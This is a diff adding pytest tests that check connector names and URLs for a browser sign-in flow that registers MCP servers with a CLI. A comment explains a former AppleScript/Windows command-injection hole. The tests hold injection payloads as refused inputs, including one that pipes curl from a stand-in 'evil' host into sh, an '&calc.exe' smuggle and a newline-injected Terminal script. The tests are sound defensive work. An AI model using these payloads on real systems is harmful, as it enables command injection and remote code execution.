@@ -988,3 +988,88 @@ def test_reading_what_the_cli_holds_never_raises(monkeypatch):
 
     monkeypatch.setattr(auth, "find_cli", lambda: "/nonexistent/claude")
     assert connectors.cli_servers() == set()
+
+
+# ------------------------------------------- what a connector name and URL may be
+#
+# The first version of the browser sign-in built a command string per platform and
+# handed it to the platform's launcher. On macOS that was an AppleScript literal, and
+# `shlex.quote` — which protects a POSIX shell — leaves `"` alone and *emits* `"` of
+# its own for any apostrophe. A connector URL could therefore close the literal and run
+# `do shell script`. On Windows the same shape ran anything after an unescaped `&`.
+#
+# The command is written to a file now and never interpolated (see `terminal`), and the
+# inputs are validated here as well. These tests are the second defence; deleting either
+# one leaves the other, which is the point.
+
+
+def test_a_connector_name_that_is_really_an_option_is_refused():
+    """`claude mcp add … <key> <url>` parses a leading dash as a flag, so a key of
+    `--transport` swallowed the two arguments after it."""
+    ok, message = connectors.start_browser_signin("--transport", "https://x.test/mcp")
+    assert ok is False
+    assert "usable connector name" in message
+
+
+def test_an_unknown_connector_cannot_be_registered_with_the_agent():
+    """One authenticated request used to add an arbitrarily-named MCP server at an
+    arbitrary URL to the CLI's user scope — which every later turn then inherits."""
+    ok, message = connectors.start_browser_signin("totally-made-up",
+                                                  "https://attacker.test/mcp")
+    assert ok is False
+    assert "not a connector this build knows about" in message
+
+
+@pytest.mark.parametrize("url", [
+    'https://a" & (do shell script "curl -s http://evil/x|sh") & "',   # the proved one
+    "https://a&calc.exe",                                              # cmd.exe, no spaces
+    "https://tenant's-workspace.test/mcp",                             # merely awkward
+    "javascript:alert(1)",
+    "https://x.test/mcp\ntell application \"Terminal\" to do script \"id\"",
+])
+def test_a_url_that_could_be_read_as_syntax_is_refused(url):
+    ok, message = connectors.start_browser_signin("nexlev", url)
+    assert ok is False, f"{url!r} was accepted"
+    assert "not one this can sign in to" in message
+
+
+def test_the_command_is_written_to_a_file_rather_than_built_as_a_string():
+    """The structural half of the fix. Escaping for a shell nested inside AppleScript
+    nested inside an argv is not reviewable, so nothing untrusted is ever parsed as
+    program text — the terminal is pointed at a file."""
+    from forgecast.agent import terminal
+
+    written = terminal._script_file(["/usr/bin/claude", "mcp", "add", "x'y\"z"])
+    body = written.read_text()
+    # The awkward argument survives intact and quoted, and no launcher syntax is in it.
+    assert "do script" not in body
+    assert "cmd /k" not in body
+    written.unlink(missing_ok=True)
+
+
+def test_a_registered_but_unapproved_server_is_not_reported_as_signed_in(monkeypatch):
+    """`claude mcp add` writes the entry immediately, before anything is authorised.
+
+    Reading the name alone put a green "signed in" pill over a connector that would
+    answer 401 — and an operator who pressed Sign in and then closed the window kept it
+    for ever.
+    """
+    import subprocess
+
+    from forgecast.agent import auth as claude_auth
+
+    listing = (
+        "Checking MCP server health...\n\n"
+        "nexlev: https://x.test/mcp (HTTP) - ⏸ Pending approval (run `claude` to approve)\n"
+        "higgsfield: https://y.test/mcp (HTTP) - ✗ Failed to connect\n"
+        "google_drive: https://z.test/mcp (HTTP) - Connected\n"
+    )
+    monkeypatch.setattr(claude_auth, "find_cli", lambda: "/usr/bin/claude")
+    monkeypatch.setattr(
+        subprocess, "run",
+        lambda *a, **k: type("R", (), {"returncode": 0, "stdout": listing, "stderr": ""})())
+
+    held = connectors.cli_servers()
+    assert "google_drive" in held
+    assert "nexlev" not in held
+    assert "higgsfield" not in held
